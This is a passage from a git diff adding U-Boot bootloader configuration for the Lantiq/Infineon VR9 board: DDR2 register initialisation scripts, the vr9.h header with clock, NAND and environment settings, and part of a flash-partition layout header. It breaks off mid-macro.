+;DDR Register programming		
+data.set 0xBF401000 %long	0x10101	
+data.set 0xBF401010 %long	0x1000100	
+data.set 0xBF401020 %long	0x1010000	
+data.set 0xBF401030 %long	0x100	
+data.set 0xBF401040 %long	0x1000000	
+data.set 0xBF401050 %long	0x1000100	
+data.set 0xBF401060 %long	0x1000100	
+data.set 0xBF401070 %long	0x1010000	
+data.set 0xBF401080 %long	0x1000101	
+data.set 0xBF401090 %long	0x0	
+data.set 0xBF4010A0 %long	0x2000100	
+data.set 0xBF4010B0 %long	0x2000401	
+data.set 0xBF4010C0 %long	0x30000	
+data.set 0xBF4010D0 %long	0x202	
+data.set 0xBF4010E0 %long	0x7080A0F	
+data.set 0xBF4010F0 %long	0x2040F	
+data.set 0xBF401100 %long	0x40000	
+data.set 0xBF401110 %long	0x60102	; if txsnr = 75ns; value = 75/6 ~= 13 = 0xd
+data.set 0xBF401120 %long	0x3020002	
+data.set 0xBF401130 %long	0x30302	;use 0x200 to have 2 pin less than 15 for address for 256Mbit DDR
+data.set 0xBF401140 %long	0x5000700	;use 0xa03 as we are going to use column size of 10 address
+data.set 0xBF401150 %long	0x30C0208	";default read delay use for Danube Ref. Board with Qimonda DDR, tuning will be done"
+data.set 0xBF401160 %long	0x0	";default read delay use for Danube Ref. Board with Qimonda DDR, tuning will be done"
+data.set 0xBF401170 %long	0x9020000	;disable ECC
+data.set 0xBF401180 %long	0x4400F03	;Default DQS out shift.. tuning will be done to it.
+data.set 0xBF401190 %long	0x0	
+data.set 0xBF4011A0 %long	0x0	
+data.set 0xBF4011B0 %long	0x4420000	
+data.set 0xBF4011C0 %long	0x0	;this is periodic refresh cycle? 7.8us /6ns 0x514
+data.set 0xBF4011D0 %long	0x0	;calculate value ..
+data.set 0xBF4011E0 %long	0x5FB	;init delay spec stated 200us needed 0x8235
+data.set 0xBF4011F0 %long	0x0	 ;Extended mode register programming... not req
+data.set 0xBF401200 %long	0x0	
+data.set 0xBF401210 %long	0x4F0000	
+data.set 0xBF401220 %long	0x200C8	
+data.set 0xBF401230 %long	0x1135DF	
+data.set 0xBF401240 %long	0xC8
+data.set 0xBF401250 %long	0x99E9
+data.set 0xBF401260 %long	0x0
+data.set 0xBF401270 %long	0x1A1F04
+data.set 0xBF401280 %long	0x1A2304
+;data.set 0xBF401290 %long	0x1A1C04
+;data.set 0xBF4012A0 %long	0x1A1C04
+data.set 0xBF4012B0 %long	0x566404
+data.set 0xBF4012C0 %long	0x566404
+;data.set 0xBF4012D0 %long	0x565F04
+;data.set 0xBF4012E0 %long	0x565F04
+;data.set 0xBF4012F0 %long	0x0
+;data.set 0xBF401300 %long	0x0
+;data.set 0xBF401310 %long	0x0
+;data.set 0xBF401320 %long	0x0
+data.set 0xBF401330 %long	0x0
+data.set 0xBF401340 %long	0x133	
+data.set 0xBF401350 %long	0xF3014B27	
+data.set 0xBF401360 %long	0xF3014B27	
+;data.set 0xBF401370 %long	0xF3014B27	
+;data.set 0xBF401380 %long	0xF3014B27	
+data.set 0xBF401390 %long	0x7C00301	
+data.set 0xBF4013A0 %long	0x7C00301	
+;data.set 0xBF4013B0 %long	0x7C00301	
+;data.set 0xBF4013C0 %long	0x7C00301	
+data.set 0xBF4013D0 %long	0x4	
+
+;Enable memory controller and DDR		
+data.set 0xBF401070 %long	0x1010100	
+
+wait 1s		
+
+;Makesure that PPE and MPS are power up in PMU
+
+;data.set 0xbf10201c %l 0x211829b
+
+;load the tuning program
+;data.load.binary xr9_ddr_tune.bin 0xbe1a0000
+
+;wait 1s
+
+;set the program counter to PPE share buffer
+;r.s pc 0xbe1a0000
+
+;wait 1s
+
+;Start running the tuning program
+;Prepare to press a key at console to start
+;This may take a few minutes to complete
+;go
+
+
+
diff --git a/board/vr9/xrx200_ddr2_197_CAS4_config.conf b/board/vr9/xrx200_ddr2_197_CAS4_config.conf
new file mode 100644
--- /dev/null
+++ b/board/vr9/xrx200_ddr2_197_CAS4_config.conf
@@ -0,0 +1,52 @@
+0xBF401070 0x0	
+0xBF401000 0x10101	
+0xBF401010 0x1000100	
+0xBF401020 0x1010000	
+0xBF401030 0x100	
+0xBF401040 0x1000000	
+0xBF401050 0x1000100	
+0xBF401060 0x1000100	
+0xBF401070 0x1010000	
+0xBF401080 0x1000101	
+0xBF401090 0x0	
+0xBF4010A0 0x2000100	
+0xBF4010B0 0x2000401	
+0xBF4010C0 0x30000	
+0xBF4010D0 0x202	
+0xBF4010E0 0x7080A0F	
+0xBF4010F0 0x2040F	
+0xBF401100 0x40000	
+0xBF401110 0x60102	
+0xBF401120 0x3020002	
+0xBF401130 0x30302	
+0xBF401140 0x5000700	
+0xBF401150 0x30C0208	
+0xBF401160 0x0	
+0xBF401170 0x9020000	
+0xBF401180 0x4400F03	
+0xBF401190 0x0	
+0xBF4011A0 0x0	
+0xBF4011B0 0x4420000	
+0xBF4011C0 0x0	
+0xBF4011D0 0x0	
+0xBF4011E0 0x5FB	
+0xBF4011F0 0x0	 
+0xBF401200 0x0	
+0xBF401210 0x4F0000	
+0xBF401220 0x200C8	
+0xBF401230 0x1135DF	
+0xBF401240 0xC8
+0xBF401250 0x99E9
+0xBF401260 0x0
+0xBF401270 0x1A1F04
+0xBF401280 0x1A2304
+0xBF4012B0 0x566404
+0xBF4012C0 0x566404
+0xBF401330 0x0
+0xBF401340 0x133	
+0xBF401350 0xF3014B27	
+0xBF401360 0xF3014B27	
+0xBF401390 0x7C00301	
+0xBF4013A0 0x7C00301	
+0xBF4013D0 0x4	
+0xBF401070 0x1010100	
diff --git a/include/configs/vr9.h b/include/configs/vr9.h
new file mode 100644
--- /dev/null
+++ b/include/configs/vr9.h
@@ -0,0 +1,316 @@
+/*
+ * (C) Copyright 2003-2005
+ * Wolfgang Denk, DENX Software Engineering, wd@denx.de.
+ *
+ * See file CREDITS for list of people who contributed to this
+ * project.
+ *
+ * This program is free software; you can redistribute it and/or
+ * modify it under the terms of the GNU General Public License as
+ * published by the Free Software Foundation; either version 2 of
+ * the License, or (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston,
+ * MA 02111-1307 USA
+ */
+
+/*
+ * This file contains the configuration parameters for the AR9 board.
+ */
+
+#ifndef __CONFIG_H
+#define __CONFIG_H
+
+#include <configs/autoconf.h>
+#include <configs/lq_cfg.h>
+#include <asm/vr9.h>
+
+
+#ifdef CONFIG_VR9_CPU_111M_RAM_111M
+#define CPU_CLOCK_RATE          111000000   /* 111 MHz clock for the MIPS core */
+#define RAM_CLOCK_RATE          111000000   /* 111 MHz clock for RAM           */
+#elif defined(CONFIG_VR9_CPU_125M_RAM_125M)
+#define CPU_CLOCK_RATE          125000000   /* 125 MHz clock for the MIPS core */
+#define RAM_CLOCK_RATE          125000000   /* 125 MHz clock for RAM           */
+#elif defined(CONFIG_VR9_CPU_166M_RAM_166M)
+#define CPU_CLOCK_RATE          166000000   /* 166 MHz clock for the MIPS core */
+#define RAM_CLOCK_RATE          166000000   /* 166 MHz clock for RAM           */
+#elif defined(CONFIG_VR9_CPU_333M_RAM_111M)
+#define CPU_CLOCK_RATE          333000000   /* 333 MHz clock for the MIPS core */
+#define RAM_CLOCK_RATE          111000000   /* 111 MHz clock for RAM           */
+#elif defined(CONFIG_VR9_CPU_333M_RAM_166M)
+#define CPU_CLOCK_RATE          333000000   /* 333 MHz clock for the MIPS core */
+#define RAM_CLOCK_RATE          166000000   /* 166 MHz clock for RAM           */
+#elif defined(CONFIG_VR9_CPU_393M_RAM_196M)
+#define CPU_CLOCK_RATE          393000000   /* 393 MHz clock for the MIPS core */
+#define RAM_CLOCK_RATE          196000000   /* 196 MHz clock for RAM           */
+#elif defined(CONFIG_VR9_CPU_442M_RAM_221M)
+#define CPU_CLOCK_RATE          442000000   /* 442 MHz clock for the MIPS core */
+#define RAM_CLOCK_RATE          221000000   /* 221 MHz clock for RAM           */
+#elif defined(CONFIG_VR9_CPU_442M_RAM_147M)
+#define CPU_CLOCK_RATE          442000000   /* 442 MHz clock for the MIPS core */
+#define RAM_CLOCK_RATE          147000000   /* 147 MHz clock for RAM           */
+#elif defined(CONFIG_VR9_CPU_500M_RAM_166M)
+#define CPU_CLOCK_RATE          500000000   /* 500 MHz clock for the MIPS core */
+#define RAM_CLOCK_RATE          166000000   /* 166 MHz clock for RAM           */
+#elif defined(CONFIG_VR9_CPU_500M_RAM_250M)
+#define CPU_CLOCK_RATE          500000000   /* 500 MHz clock for the MIPS core */
+#define RAM_CLOCK_RATE          250000000   /* 250 MHz clock for RAM           */
+#elif defined(CONFIG_VR9_CPU_500M_RAM_200M)
+#define CPU_CLOCK_RATE          500000000   /* 500 MHz clock for the MIPS core */
+#define RAM_CLOCK_RATE          200000000   /* 250 MHz clock for RAM           */
+#elif defined(CONFIG_VR9_CPU_600M_RAM_200M)
+#define CPU_CLOCK_RATE          600000000   /* 600 MHz clock for the MIPS core */
+#define RAM_CLOCK_RATE          200000000   /* 200 MHz clock for RAM           */
+#elif defined(CONFIG_VR9_CPU_600M_RAM_300M)
+#define CPU_CLOCK_RATE          600000000   /* 600 MHz clock for the MIPS core */
+#define RAM_CLOCK_RATE          300000000   /* 300 MHz clock for RAM           */
+#endif
+
+#define F_SSC_CLK  get_fpi_clk()
+#define CONFIG_SYS_HZ 1000
+#define CONFIG_ENV_SPI_CS 3
+#define CONFIG_ENV_SPI_MODE CONFIG_SF_DEFAULT_MODE
+
+
+
+#ifndef	CPU_CLOCK_RATE
+/* allowed values: 100000000, 133000000, and 150000000 */
+#define CPU_CLOCK_RATE	150000000	/* default: 150 MHz clock for the MIPS core */
+#endif
+
+//#define CONFIG_BAUDRATE		115200
+
+
+/* valid baudrates */
+#define CONFIG_SYS_BAUDRATE_TABLE	{ 9600, 19200, 38400, 57600, 115200 }
+
+#define CONFIG_SYS_ASC_BASE 0xbe100c00
+#define	CONFIG_TIMESTAMP		/* Print image info with timestamp */
+
+#ifndef CONFIG_PREBOOT
+#define CONFIG_PREBOOT	"echo;"	\
+	"echo Type \\\"run flash_nfs\\\" to mount root filesystem over NFS;" \
+	"echo"
+#endif
+
+#undef	CONFIG_BOOTARGS
+
+#define CONFIG_EXTRA_ENV_SETTINGS   <configs/lq_extra_env.h>
+
+
+/*
+ * Miscellaneous configurable options
+ */
+#define	CONFIG_SYS_LONGHELP				/* undef to save memory      */
+#define	CONFIG_SYS_PROMPT		"VR9 # "	/* Monitor Command Prompt    */
+#define	CONFIG_SYS_CBSIZE		1024		/* Console I/O Buffer Size   */
+#define	CONFIG_SYS_PBSIZE (CONFIG_SYS_CBSIZE+sizeof(CONFIG_SYS_PROMPT)+16)  /* Print Buffer Size */
+#define	CONFIG_SYS_MAXARGS		32		/* max number of command args*/
+
+#define CONFIG_SYS_MALLOC_LEN		4096*1024
+
+#define CONFIG_SYS_BOOTPARAMS_LEN	256*1024
+
+
+/********************************************************************************************
+ * CONFIG_SYS_MIPS_TIMER_FREQ will be used as the frequency of the mips cp0 count register(CC)
+ * The resolution should be obtained from rdhwr like following:
+ * .set    mips32r2
+ * li      t1, 0x8
+ * mtc0    t1, CP0_HWRENA
+ * rdhwr   t0, $3
+ * The value in t0(CCRes) denotes the number of cycles between update of the register
+ * In the 34K core, the CCRes value is 2 to indicate that the CC register increments every
+ * second CPU cycle, which means that the CC frequency is half of the cpu frequency
+***********************************************************************************************/
+#define CONFIG_SYS_MIPS_TIMER_FREQ	(CPU_CLOCK_RATE/2)
+
+
+#define CONFIG_SYS_SDRAM_BASE		0x80000000
+
+#define	CONFIG_SYS_LOAD_ADDR		0x80100000	/* default load address	*/
+
+#define CONFIG_SYS_MEMTEST_START	0x80100000
+#define CONFIG_SYS_MEMTEST_END		0x80800000
+
+/*-----------------------------------------------------------------------
+ * FLASH and environment organization
+ */
+#define CONFIG_SYS_MAX_FLASH_BANKS	1	/* max number of memory banks */
+#define CONFIG_SYS_MAX_FLASH_SECT	(256)	/* max number of sectors on one chip */
+
+#define PHYS_FLASH_1		0xb0000000 /* Flash Bank #1 */
+#define PHYS_FLASH_2		0xb0800000 /* Flash Bank #2 */
+
+#define CONFIG_SYS_FLASH_SWAP_ADDR
+
+#define FLASH_FIXUP_ADDR_8(addr)        ((void*)((ulong)(addr)^2))
+#define FLASH_FIXUP_ADDR_16(addr)       ((void*)((ulong)(addr)^2))
+
+#define CONFIG_SYS_FLASH_CFI_WIDTH      FLASH_CFI_16BIT
+
+#define CONFIG_EBU_ADDSEL0               0x10000031
+#define CONFIG_EBU_BUSCON0               0x0001D7FF
+
+
+/* The following #defines are needed to get flash environment right */
+#define	CONFIG_SYS_MONITOR_BASE	CONFIG_RAM_TEXT_BASE
+
+#define	CONFIG_SYS_MONITOR_LEN		(512 << 10)
+
+#define CONFIG_SYS_INIT_SP_OFFSET	0x400000
+
+#define CONFIG_SYS_FLASH_BASE		PHYS_FLASH_1
+
+/* timeout values are in ticks */
+#define CONFIG_SYS_FLASH_ERASE_TOUT	(2 * CONFIG_SYS_HZ) /* Timeout for Flash Erase */
+#define CONFIG_SYS_FLASH_WRITE_TOUT	(2 * CONFIG_SYS_HZ) /* Timeout for Flash Write */
+
+
+#define CONFIG_FLASH_16BIT
+
+#define CONFIG_NR_DRAM_BANKS	1
+
+#define CONFIG_NET_MULTI
+
+#define CONFIG_SYS_MAX_NAND_DEVICE    1
+#define CONFIG_SYS_NAND_BASE   0xb4000000
+
+#define NAND_BASE_ADDRESS  0xB4000000
+#define CFG_NAND_BASE NAND_BASE_ADDRESS
+#define NAND_WRITE(addr, val)     *((volatile u8*)(NAND_BASE_ADDRESS | (addr))) = val;while((*EBU_NAND_WAIT & 0x08) == 0);
+//#define NAND_WRITE(addr, val)     *((volatile u8*)(NAND_BASE_ADDRESS | (addr)))=val;
+#define NAND_READ(addr, val)      val = *((volatile u8*)(NAND_BASE_ADDRESS | (addr))); while((*EBU_NAND_WAIT & 0x08) == 0);
+#define NAND_CE_SET         *EBU_NAND_CON   = 0x00F405F3
+#define NAND_CE_CLEAR       *EBU_NAND_CON   = 0x000005F3
+#define NAND_READY       ( ((*EBU_NAND_WAIT)&0x07) == 7)
+
+#define NAND_READY_CLEAR  *EBU_NAND_WAIT = 0;
+#define WRITE_CMD    0x18
+#define WRITE_ADDR   0x14
+#define WRITE_LADDR  0x10
+#define WRITE_DATA  0x10
+#define READ_DATA    0x10
+#define READ_LDATA   0x00
+#define ACCESS_WAIT
+#define IFX_ATC_NAND 0xc176
+#define IFX_BTC_NAND 0xc166
+#define ST_512WB2_NAND 0x2076
+#define NAND_LATCH_ENABLE 
+#define NAND_CLRALE  *EBU_NAND_CON &=~(1<<18);
+#define NAND_SETALE  *EBU_NAND_CON |=1<<18;
+#define NAND_CLRCLE  *EBU_NAND_CON &=~(1<<19);
+#define NAND_SETCLE  *EBU_NAND_CON |=1<<19;
+
+
+#define NAND_DISABLE_CE(nand) *EBU_NAND_CON = *EBU_NAND_CON & ~(1<<20);
+#define NAND_ENABLE_CE(nand)  *EBU_NAND_CON = *EBU_NAND_CON |(1<<20);
+#define NAND_WAIT_READY(nand) while(!NAND_READY){}
+#define WRITE_NAND_COMMAND(d, adr) NAND_WRITE(WRITE_CMD,d);
+#define WRITE_NAND_ADDRESS(d, adr) NAND_WRITE(WRITE_ADDR,d);
+#define WRITE_NAND(d, adr) NAND_WRITE(WRITE_DATA,d);
+#define READ_NAND(adr) *((volatile u8*)(NAND_BASE_ADDRESS | (READ_DATA)))
+#define IFX_NAND_CTL_CLRALE *EBU_NAND_CON &=~(1<<18);
+#define IFX_NAND_CTL_SETALE *EBU_NAND_CON |=1<<18;
+
+
+#define CONFIG_SYS_NAND_PAGE_SIZE   CONFIG_NAND_PAGE_SIZE   /* NAND chip page size        */
+#define CONFIG_SYS_NAND_BLOCK_SIZE  CONFIG_NAND_BLOCK_SIZE /* NAND chip block size       */
+#define CONFIG_SYS_NAND_PAGE_COUNT  (CONFIG_SYS_NAND_BLOCK_SIZE / CONFIG_SYS_NAND_PAGE_SIZE)
+                        /* NAND chip page count       */
+#define CONFIG_SYS_NAND_5_ADDR_CYCLE            
+
+#define CONFIG_SYS_NAND_ECCSIZE 256
+#define CONFIG_SYS_NAND_ECCBYTES    3
+#define CONFIG_SYS_NAND_ECCSTEPS    (CONFIG_SYS_NAND_PAGE_SIZE / CONFIG_SYS_NAND_ECCSIZE)
+#define CONFIG_SYS_NAND_ECCTOTAL    (CONFIG_SYS_NAND_ECCBYTES * CONFIG_SYS_NAND_ECCSTEPS)
+
+
+#if (CONFIG_NAND_PAGE_SIZE == 0x200 )
+#define CONFIG_SYS_NAND_BAD_BLOCK_POS   5       /* Location of bad block marker*/
+#define CONFIG_SYS_NAND_OOBSIZE 16
+#define CONFIG_SYS_NAND_ECCPOS      {0, 1, 2, 3, 6, 7}
+ #if (CONFIG_NAND_FLASH_SIZE>=32)
+     #define CONFIG_SYS_NAND_4_ADDR_CYCLE    
+ #endif
+#else
+#define CONFIG_SYS_NAND_BAD_BLOCK_POS   0       /* Location of bad block marker*/
+#define CONFIG_SYS_NAND_OOBSIZE 64
+#define CONFIG_SYS_NAND_ECCPOS      {40, 41, 42, 43, 44, 45, 46, 47, \
+                                     48, 49, 50, 51, 52, 53, 54, 55, \
+                                     56, 57, 58, 59, 60, 61, 62, 63}
+#endif
+
+
+#define CONFIG_SYS_NAND_U_BOOT_SIZE  ( 256 << 10 )
+
+#ifdef CONFIG_LTQ_SECURE_BOOT 
+#define CONFIG_SYS_NAND_U_BOOT_DST   CONFIG_STAGE2_LOADADDR
+#define CONFIG_SYS_NAND_U_BOOT_START CONFIG_STAGE2_LOADADDR
+#else
+#define CONFIG_SYS_NAND_U_BOOT_DST   CONFIG_BOOTSTRAP_TEXT_BASE
+#define CONFIG_SYS_NAND_U_BOOT_START CONFIG_BOOTSTRAP_TEXT_BASE
+#endif
+
+#define CONFIG_SYS_NAND_U_BOOT_OFFS CONFIG_NAND_SPL_BLOCK_SIZE
+
+#ifdef CONFIG_BOOT_FROM_NOR
+#define IFX_CFG_FLASH_DDR_CFG_START_ADDR      0xB000FFE0
+#define IFX_CFG_FLASH_DDR_CFG_SIZE            32
+#define IFX_CFG_FLASH_DDR_CFG_END_ADDR        0xb000ffff
+#elif defined(CONFIG_BOOT_FROM_SPI)
+#define IFX_CFG_FLASH_DDR_CFG_START_ADDR      0x0000FFE0
+#define IFX_CFG_FLASH_DDR_CFG_SIZE            32
+#define IFX_CFG_FLASH_DDR_CFG_END_ADDR        0x0000ffff
+#define CONFIG_ENV_SECT_SIZE 0x1000
+#else /*CONFIG_BOOT_FRON_NAND*/
+  #ifdef CONFIG_LTQ_SECURE_BOOT
+     #define IFX_CFG_FLASH_DDR_CFG_START_ADDR      0x00007fe0
+     #define IFX_CFG_FLASH_DDR_CFG_SIZE            32
+	 #define IFX_CFG_FLASH_DDR_CFG_END_ADDR        0x00007fff
+  #else
+     #define IFX_CFG_FLASH_DDR_CFG_START_ADDR      0x00023fe0
+     #define IFX_CFG_FLASH_DDR_CFG_SIZE            32
+     #define IFX_CFG_FLASH_DDR_CFG_END_ADDR        0x00023fff
+  #endif 
+#endif
+
+/* Address and size of Primary Environment Sector	*/
+#ifdef CONFIG_CMD_UBI 
+#define CONFIG_ENV_OFFSET     0x100000
+#define CONFIG_ENV_ADDR       CONFIG_ENV_OFFSET
+#define CONFIG_NAND_ENV_DST   (CONFIG_SYS_NAND_U_BOOT_DST + CONFIG_SYS_NAND_U_BOOT_SIZE)
+#else
+#define CONFIG_ENV_OFFSET	  IFX_CFG_FLASH_UBOOT_CFG_START_ADDR
+#define CONFIG_ENV_ADDR		  IFX_CFG_FLASH_UBOOT_CFG_START_ADDR
+#define CONFIG_ENV_SIZE		  IFX_CFG_FLASH_UBOOT_CFG_SIZE
+#endif
+
+#define CONFIG_NAND_ENV_DST   (CONFIG_SYS_NAND_U_BOOT_DST + CONFIG_SYS_NAND_U_BOOT_SIZE)
+
+#ifdef CONFIG_ENV_REDUND
+ #define CONFIG_ENV_OFFSET_REDUND    0x140000
+ #define CONFIG_ENV_RANGE            0x40000
+ #define CONFIG_ENV_SIZE_REDUND  CONFIG_ENV_SIZE
+#else
+ #define CONFIG_ENV_RANGE            0x80000
+#endif
+
+
+#define CONFIG_TUNING_STATUS 0xBE22FF2C 
+#define CONFIG_TUNING_SP     0xBE22FF00 
+
+
+#define MTDIDS_DEFAULT   CONFIG_MTDIDS
+#define MTDPARTS_DEFAULT CONFIG_MTDPARTS
+
+
+#endif	/* __CONFIG_H */
diff --git a/include/configs/vr9_cfg.h b/include/configs/vr9_cfg.h
new file mode 100755
--- /dev/null
+++ b/include/configs/vr9_cfg.h
@@ -0,0 +1,1741 @@
+/* ============================================================================
+ * Copyright (C) 2003[- 2004] ? Infineon Technologies AG.
+ *
+ * All rights reserved.
+ * ============================================================================
+ *
+ * ============================================================================
+ *
+ * This document contains proprietary information belonging to Infineon
+ * Technologies AG. Passing on and copying of this document, and communication
+ * of its contents is not permitted without prior written authorisation.
+ *
+ * ============================================================================
+ *
+ * File Name: ifx_cfg.h
+ * Author : Mars Lin (mars.lin@infineon.com)
+ * Date:
+ *
+ * ===========================================================================
+ *
+ * Project:
+ * Block:
+ *
+ * ===========================================================================
+ * Contents:  This file contains the data structures and definitions used
+ *        by the core iptables and the sip alg modules.
+ * ===========================================================================
+ * References:
+ */
+
+/*
+ * This file contains the configuration parameters for the IFX board.
+ */
+
+
+/*-----------------------------------------------------------------------
+ * Board specific configurations
+ */
+#if defined(CONFIG_BOOT_FROM_NOR) || defined(CONFIG_BOOT_FROM_UART)
+
+#ifdef CONFIG_NOR_FLASH_2M
+#define IFX_CONFIG_FLASH_SIZE 2
+#elif CONFIG_NOR_FLASH_4M
+#define IFX_CONFIG_FLASH_SIZE 4
+#elif CONFIG_NOR_FLASH_8M
+#define IFX_CONFIG_FLASH_SIZE 8
+#endif
+
+#ifndef IFX_CONFIG_FLASH_SIZE
+#define IFX_CONFIG_FLASH_SIZE 4
+#endif
+
+#ifdef CONFIG_FIRMWARE_IN_ROOTFS
+//2MB flash partition
+#if (IFX_CONFIG_FLASH_SIZE == 2)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0xB0000000\0"                                      \
+        "part1_begin=0xB0020000\0"                                      \
+        "total_part=2\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO          \
+  "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"  \
+  "data_block1=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0" \
+  "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0" \
+  "data_block3=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"   \
+  "data_block4=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"    \
+  "data_block5=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"  \
+  "total_db=6\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME          "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR          0xB0000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME         "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR         0xB0020000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME         "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR         0xB01FADFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE               0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME           "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR           0xB01FB200
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                 0x4000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR             0xB01FEDFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME            "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR            0xB01FEE00
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                  0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR              0xB01FFDFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME        "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR        0xB01FFE00
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE              0x0200
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR          0xB01FFFFF
+
+  #define IFX_CFG_FLASH_END_ADDR                        0xB01FFFFF
+
+//4MB flash partition
+#elif (IFX_CONFIG_FLASH_SIZE == 4)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0xB0000000\0"                                      \
+        "part1_begin=0xB0020000\0"                                      \
+        "total_part=2\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block4=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block5=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "total_db=6\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME           "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR           0xB0000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME          "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR          0xB0020000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME          "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR          0xB03F6DFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME            "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR            0xB03ECE00
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                  0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR              0xB03FCDFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME             "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR             0xB03FEE00
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                   0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR               0xB03FFDFF
+
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME         "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR         0xB03FFE00
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE               0x0200
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR           0xB03FFFFF
+
+  #define IFX_CFG_FLASH_END_ADDR                         0xB03FFFFF
+
+#elif (IFX_CONFIG_FLASH_SIZE == 8)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0xB0000000\0"                                      \
+        "part1_begin=0xB0020000\0"                                      \
+        "total_part=2\0"
+
+#ifdef CONFIG_OVERLAY
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_OVERLAY_IMAGE_BLOCK_NAME "\0"         \
+        "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block6=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "data_block7=" IFX_CFG_FLASH_WLAN_CFG_BLOCK_NAME "\0"    \
+        "total_db=8\0"        
+#else
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
